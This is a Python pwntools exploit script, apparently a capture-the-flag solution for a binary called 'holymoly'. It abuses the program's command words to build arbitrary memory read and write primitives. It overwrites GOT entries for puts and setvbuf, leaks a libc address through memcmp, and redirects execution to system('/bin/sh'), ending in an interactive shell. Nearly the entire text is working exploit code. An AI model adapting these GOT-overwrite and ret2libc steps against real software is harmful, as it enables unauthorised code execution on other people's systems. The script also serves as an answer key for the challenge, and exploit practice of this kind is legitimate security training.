#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('holymoly_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
b *0x0401577
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

MAX_SIZE = 0xBEEE
MAX_INT = 0x7fffffff
AMOUNTS = [0x1000, 0x100, 0x10, 0x1]

data = {
    0: "holymoly",
    1: "rolypoly",
    2: "monopoly",
    3: "guacamole",
    4: "robocarpoli",
    5: "halligalli",
    6: "broccoli",
    7: "bordercollie",
    8: "blueberry",
    9: "cranberry",
    10: "mystery"
}

def init():
    global io
    io = start()
    return 

def Increment(count, idx):
    return data[idx] * count 

def Decrement(count, idx):
    return data[idx + 4] * count

def OperateSwitch():
    MYSTERY_ID = 10
    return data[MYSTERY_ID]

def Read():
    BLUEBERRY_ID = 8
    return data[BLUEBERRY_ID]

def Write():
    CRANBERRY_ID = 9
    return data[CRANBERRY_ID]

def calculatePad(addr):
    remaining = addr
    commands = []

    steps = sorted(
        list(enumerate(AMOUNTS)),
        key=lambda x: x[1],
        reverse=True
    )

    while remaining != 0:
        for idx, amt in steps:
            if amt == 0:
                continue

            count = abs(remaining // amt)
            if count == 0:
                continue

            if remaining > 0:
                for _ in range(count):
                    commands.append(data[idx])
                remaining -= amt * count
            else:
                for _ in range(count):
                    commands.append(data[idx + 4])
                remaining += amt * count

            break

    return commands

def Overwrite(target, value):
    song = OperateSwitch()
    song += "".join(calculatePad(target))
    song += OperateSwitch()
    song += "".join(calculatePad(value))
    song += Write()
    return song

def leakMemory(addr):
    song = OperateSwitch()
    song += "".join(calculatePad(addr))
    song += Read()
    return song


def solve():

    main_addr = 0x4011FA
    leave_ret = 0x401265

    """
    ret2main for leak libc
    """

    song = Overwrite(exe.got['puts'], main_addr)
    io.sendlineafter(b"?", song.encode())

    song = leakMemory(exe.got["memcmp"])
    io.sendlineafter(b"?", song.encode())
    io.recvuntil(b" ")
    memcmp = u64(io.recv(8))
    libc.address = memcmp - 0x184cc0
    binsh = next(libc.search(b"/bin/sh\x00"))

    info("libc base: %#x", libc.address)

    """
    overwrite setvbuf GOT to leave;ret to preserve intial global variables
    """

    song = OperateSwitch()
    song += Overwrite(exe.got["setvbuf"], leave_ret)    
    io.sendlineafter(b"?", song.encode())
 
    """
    Overwrite amounts to a max signed (+ve) int value to bypass low size limit
    """

    song = calculatePad(MAX_INT - leave_ret)
    batch = ""
    for cmd in song:
        if len(batch) + len(cmd) > MAX_SIZE:
            io.sendlineafter(b"?", batch.encode())
            batch = cmd
        else:
            batch += cmd

    if batch:
        print("sigh")
        io.sendlineafter(b"?", batch.encode())


    song = OperateSwitch()
    song += Increment(2, 2)
    song += Increment(4, 3)
    song += Write()
    io.sendlineafter(b"?", song.encode())

    """
    set val to binsh string address
    """
    
    song = Increment(0x30, 3)
    song += OperateSwitch()
    io.sendlineafter(b"?", song.encode())

    AMOUNTS[1] = MAX_INT
    AMOUNTS[2] = 0x0

    count = (binsh // AMOUNTS[1]) - 1 # for some reason need to subtract 1
    song = Increment(count, 1) 
    cmd_len = len(data[1]) 
    nsize = MAX_SIZE // cmd_len

    for i in range(0, count, nsize):
        batch = Increment(min(nsize, count - i), 1)
        io.sendlineafter(b"?", batch.encode())
    
    song = calculatePad(binsh % AMOUNTS[1])
    batch = ""
    for cmd in song:
        if len(batch) + len(cmd) > MAX_SIZE:
            io.sendlineafter(b"?", batch.encode())
            batch = cmd
        else:
            batch += cmd

    batch += OperateSwitch()
    batch += Decrement(4, 3)
    batch += Increment(16, 3)
    batch += Write()
    
    if batch:
        io.sendlineafter(b"?", batch.encode())

    offset = exe.sym["stderr"] - exe.got["setvbuf"]
    song = Decrement(offset, 3)
    song += OperateSwitch()
    io.sendlineafter(b"?", song.encode())

    offset = (binsh - libc.sym["system"]) // AMOUNTS[0]
    remainder = (binsh - libc.sym["system"]) % AMOUNTS[0]

    song = Decrement(offset , 0)
    song += Decrement(remainder , 3)
    song += Write()
    io.sendlineafter(b"?", song.encode())

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

